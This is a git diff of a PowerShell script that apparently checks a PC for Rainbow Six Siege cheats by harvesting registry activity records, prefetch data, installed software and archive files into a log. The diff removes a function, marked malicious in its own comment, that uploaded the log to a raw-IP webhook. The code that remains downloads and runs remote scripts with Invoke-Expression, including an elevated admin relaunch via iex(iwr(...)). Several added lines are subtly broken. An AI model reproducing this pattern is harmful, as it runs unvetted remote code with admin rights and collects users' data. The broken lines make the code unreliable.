@@ -1,16 +1,16 @@
-#code was here to check this is legit, useless tho, unless I want to replace reapiin's code with my own
+# Function to display header information
 function Write-Header {
     Clear-Host
-
     $asciiArtUrl = "https://raw.githubusercontent.com/Annabxlla/art/refs/heads/master/art.ps1"
     $asciiArtScript = Invoke-RestMethod -Uri $asciiArtUrl
     Invoke-Expression $asciiArtScript
     
-    $encodedTitle = "Q3JhY2tlZCBieSBBbm5hYnhsbGEgb24gRGlzY29yZCDimaU="
+    $encodedTitle = "VXBkYXRlZCBieSBAYW5uYWJ4bGxhIG9uIERpc2NvcmQg4pml"
     $titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
     $Host.UI.RawUI.WindowTitle = $titleText
 }
 
+# Function to test Secure Boot status
 function Test-SecureBoot {
     try {
         if (Get-Command Confirm-SecureBootUEFI -ErrorAction SilentlyContinue) {
@@ -28,6 +28,7 @@ function Test-SecureBoot {
     }
 }
 
+# Function to fetch OneDrive path from registry or environment variables
 function Get-OneDrivePath {
     try {
         $oneDrivePath = (Get-ItemProperty "HKCU:\Software\Microsoft\OneDrive" -Name "UserFolder").UserFolder
@@ -48,6 +49,7 @@ function Get-OneDrivePath {
     }
 }
 
+# Function to get Ubisoft launcher path from default directories
 function Get-UbisoftLauncherPath {
     $defaultPaths = @(
         "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher",
@@ -64,6 +66,7 @@ function Get-UbisoftLauncherPath {
     return $null
 }
 
+# Function to format output for display in log
 function Format-Output {
     param($name, $value)
     $output = "{0} : {1}" -f $name, $value -replace 'System.Byte\[\]', ''
@@ -72,13 +75,12 @@ function Format-Output {
     }
 }
 
+# Function to get Ubisoft profile paths
 function Get-UbisoftProfilePaths {
-    $userName = $env:UserName
-    $oneDrivePath = Get-OneDrivePath
+    $documentsPath = [System.Environment]::GetFolderPath('MyDocuments')
     $ubisoftPath = Get-UbisoftLauncherPath
     $potentialPaths = @(
-        "C:\Users\$userName\Documents\My Games\Rainbow Six - Siege",
-        "$oneDrivePath\Documents\My Games\Rainbow Six - Siege",
+        "$documentsPath\My Games\Rainbow Six - Siege",
         "$ubisoftPath\savegames")
     $allUserNames = @()
 
@@ -89,7 +91,9 @@ function Get-UbisoftProfilePaths {
         }
     }
 
-    $uniqueUserNames = $allUserNames | Select-Object -Unique
+    # Filter to only include UUIDs
+    $uuidPattern = '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$'
+    $uniqueUserNames = $allUserNames | Select-Object -Unique | Where-Object { $_ -match $uuidPattern }
 
     if ($uniqueUserNames.Count -eq 0) {
         Write-Host "`nSkipping Stats.cc Search" -ForegroundColor Yellow
@@ -110,6 +114,7 @@ function Get-UbisoftProfilePaths {
     }
 }
 
+# Function to find suspicious files
 function Find-SusFiles {
     Write-Host " [-] Finding suspicious files names..." -ForegroundColor DarkMagenta
     $susFiles = @()
@@ -143,6 +148,7 @@ function Find-SusFiles {
     }
 }
 
+# Function to get Zip and Rar files
 function Get-ZipRarFiles {
     Write-Host " [-] Finding .zip and .rar files. Please wait..." -ForegroundColor DarkMagenta
     $global:KeyFiles += "`n-----------------`nZip/Rar Files:`n"
@@ -170,6 +176,7 @@ function Get-ZipRarFiles {
     }
 }
 
+# Function to get registry key files
 function Get-RegistryKeyFiles {
     Write-Host " `n [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " UserSettings" -ForegroundColor White -NoNewline; Write-Host " Entries " -ForegroundColor DarkMagenta
     $global:KeyFiles += "`n-----------------`nBAMStateUserSettings:`n"
@@ -231,58 +238,71 @@ function Get-RegistryKeyFiles {
     $global:logEntries = $global:logEntries | Sort-Object | Get-Unique | Where-Object { $_ -notmatch "\{.*\}" } | ForEach-Object { $_ -replace ":", "" }
 }
 
-function Write-BrowserFolders {
-    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " reg entries" -ForegroundColor White -NoNewline; Write-Host " inside PowerShell..." -ForegroundColor DarkMagenta
+# Function to check Wi-Fi support
+function Test-WifiSupport {
+    # Get all physical network adapters, including hidden ones
+    $wifiAdapters = Get-NetAdapter -Name * -Physical -IncludeHidden | Where-Object { $_.InterfaceDescription -match "Wi-Fi" }
+
+    if ($wifiAdapters.Count -gt 0) {
+        Write-Host "[-] Wi-Fi Support Detected." -ForegroundColor Green
+        $wifiAdapters | ForEach-Object { Write-Host "    Adapter: $($_.InterfaceDescription) - Status: $($_.Status)" }
+        return $wifiAdapters
+    } else {
+        Write-Host "[-] No Wi-Fi adapters detected." -ForegroundColor Red
+        return $null
+    }
+}
+
+# Function to get installed browsers and their versions
+function Get-InstalledBrowsers {
+    $browsers = @()
     $registryPath = "HKLM:\SOFTWARE\Clients\StartMenuInternet"
 
-    if (Test-Path $registryPath) {
-        $browserFolders = Get-ChildItem -Path $registryPath
-        $global:logEntries += "`n==============="
-        $global:logEntries += "`nBrowser Folders:"
-        foreach ($folder in $browserFolders) { $global:logEntries += "`n" + $folder.Name }
-    } else {
-        Write-Host "Registry path for browsers not found." -ForegroundColor Red
-    }
-}
+    # Get the list of browser keys from the registry
+    $browserKeys = Get-ChildItem -Path $registryPath | Where-Object { $_.PSChildName -match "^[A-Za-z0-9]" }
 
-function Write-WindowsInstallDate {
-    Write-Host " [-] Logging" -ForegroundColor DarkMagenta -NoNewline; Write-Host " Windows install" -ForegroundColor White -NoNewline; Write-Host " date..." -ForegroundColor DarkMagenta
-    $os = Get-WmiObject -Class Win32_OperatingSystem
-    $installDate = $os.ConvertToDateTime($os.InstallDate)
-    $global:logEntries += "`n==============="
-    $global:logEntries += "`nWindows Installation Date: $installDate"
-}
-
-function Get-RecentTlscans {
-    Write-Host " [-] Checking" -ForegroundColor DarkMagenta -NoNewline; Write-Host " for .tlscan" -ForegroundColor White -NoNewline; Write-Host " folders..." -ForegroundColor DarkMagenta
-    $recentDocsPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
-    $tlscanFound = $false
-    if (Test-Path $recentDocsPath) {
-        $recentDocs = Get-ChildItem -Path $recentDocsPath
-        foreach ($item in $recentDocs) {
-            if ($item.PSChildName -match "\.tlscan") {
-                $tlscanFound = $true
-                $folderPath = Get-ItemProperty -Path "$recentDocsPath\$($item.PSChildName)" -Name MRUListEx
-                $global:logEntries += "`n.tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath"
-                Write-Host ".tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath" -ForegroundColor Red
-            } elseif ($item.PSChildName -match "\.arbsys"){
-                $tlscanFound = $true
-                $folderPath = Get-ItemProperty -Path "$recentDocsPath\$($item.PSChildName)" -Name MRUListEx
-                $global:logEntries += "`n.arbsys FOUND. PCIe FIRMWARE DUMP DETECTED in $folderPath"
-                Write-Host ".arbsys FOUND. PCIe FIRMWARE DUMP DETECTED in $folderPath" -ForegroundColor Red
-            }
+    foreach ($key in $browserKeys) {
+        $browserName = $key.PSChildName
+        $browserDisplayName = (Get-ItemProperty -Path $key.PSPath -Name "LocalizedString" -ErrorAction SilentlyContinue).LocalizedString
+        if (-not $browserDisplayName) {
+            $browserDisplayName = $browserName
+        }
+        $browsers += [PSCustomObject]@{
+            Browser = $browserDisplayName
+            Key     = $browserName
         }
     }
-    if (-not $tlscanFound) {
-        Write-Host " [-] No .tlscan ext found." -ForegroundColor Green
-        Write-Host " [-] No .arbsys ext found." -ForegroundColor Green
+
+    if ($browsers.Count -gt 0) {
+        Write-Host "`n[+] Installed Browsers:`n"
+        $browsers | ForEach-Object { Write-Host "$($_.Browser)" }
+    } else {
+        Write-Host "`n[-] No installed browsers detected." -ForegroundColor Red
+    }
+}
+
+# Function to get installed applications
+function Get-InstalledApplications {
+    # list only common applications that are likely to be present:
+    $susApps = @(
+        "Arbor",
+        "Vivado"
+        )
+    $installedApps = Get-WmiObject -Class Win32_Product
+    if ($installedApps.CounWt -gt 0) {
+        Write-Host "`n[+] Installed Applications:`n"
+        $installedApps | Where-Object { $_.Name -match $susApps -and $_.Name -notmatch "Update for" } | ForEach-Object { Write-Host $_.Name }
+        $global:logEntries += "`n-----------------`nInstalled Applications:`n"
+        $installedApps | Where-Object { $_.Name -notmatch "Update" -and $_.Name -notmatch "Windows" -and $_.Name -notmatch "Microsoft" } | ForEach-Object { $global:logEntries += $_.Name }
+    } else {
+        Write-Host "`n[-] No installed applications detected." -ForegroundColor Red
     }
 }
 
 function Write-PrefetchFiles {
     Write-Host " [-] Fetching Last Ran Dates..." -ForegroundColor DarkMagenta
     $prefetchPath = "C:\Windows\Prefetch"
-    $pfFilesHeader = "`n=======================`n.pf files:`n"
+    $pfFilesHeader = "n=======================n.pf files:n"
 
     if (Test-Path $prefetchPath) {
         $pfFiles = Get-ChildItem -Path $prefetchPath -Filter *.pf -File
@@ -290,7 +310,7 @@ function Write-PrefetchFiles {
             $global:logEntries += $pfFilesHeader
             $pfFiles | ForEach-Object {
                 $logEntry = "{0} | {1}" -f $_.Name, $_.LastWriteTime
-                $global:logEntries += "`n" + $logEntry
+                $global:logEntries += "n" + $logEntry
             }
         } else {
             Write-Host "No .pf files found in the Prefetch folder." -ForegroundColor Green
@@ -300,43 +320,7 @@ function Write-PrefetchFiles {
     }
 }
 
-function Send-Logs {
-    # return, this is malicious.
-    return
-    <#
-    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
-
-    if (Test-Path $logFilePath) {
-        $url = "http://51.81.215.34:5000/webhook"
-
-        $fileContent = Get-Content -Path $logFilePath -Raw
-
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"PcCheckLogs.txt`"",
-            "Content-Type: text/plain$LF",
-            $fileContent,
-            "--$boundary--$LF"
-        ) -join $LF
-
-        try {
-            $response = Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
-            Write-Host "."
-        }
-        catch {
-            Write-Host "Failed to send log: $_" -ForegroundColor Red
-        }
-    }
-    else {
-        Write-Host "Log file not found." -ForegroundColor Red
-    }
-        #>
-}
-
+# Main execution flow
 function Main {
     $global:logEntries = @()
     $desktopPath = [System.Environment]::GetFolderPath('Desktop')
@@ -344,29 +328,27 @@ function Main {
 
     Write-Header
     Test-SecureBoot
-    Write-WindowsInstallDate
-    Write-BrowserFolders
-    Get-RecentTlscans
+    Test-WifiSupport | Out-Null
+    Get-InstalledBrowsers
+    Get-InstalledApplications
     Get-ZipRarFiles
     Get-RegistryKeyFiles
-    Write-PrefetchFiles
+    Write-PrefetchFiles # fix this
     Find-SusFiles
+
+
+    $global:logEntries | Out-File $logFilePath -Encoding utf8
+    Write-Host " Log file created: $logFilePath"
+    Get-Content $logFilePath | Set-Clipboard
+    Write-Host " Log file copied to clipboard."
     Get-UbisoftProfilePaths
 
-    #Send-Logs
+}
 
-    $global:logEntries | Out-File -FilePath $logFilePath -Encoding UTF8 -NoNewline
-    Start-Sleep -Seconds 1
-
-    if (Test-Path $logFilePath) {
-        Set-Clipboard -Path $logFilePath
-        Write-Host "Log file copied to clipboard." -ForegroundColor DarkRed
-    } else {
-        Write-Host "Log file not found on the desktop." -ForegroundColor Red
-    }
-
-    $content = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/Annabxlla/art/refs/heads/master/credits.ps1"
-    Invoke-Expression $content
+#Make sure its running in admin mode.
+if(!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+    Start-Process powershell –verb runAs -ArgumentList "-NoExit -Command iex(iwr('https://raw.githubusercontent.com/Annabxlla/art/refs/heads/master/main.ps1'))"
+    Exit
 }
 
 Main
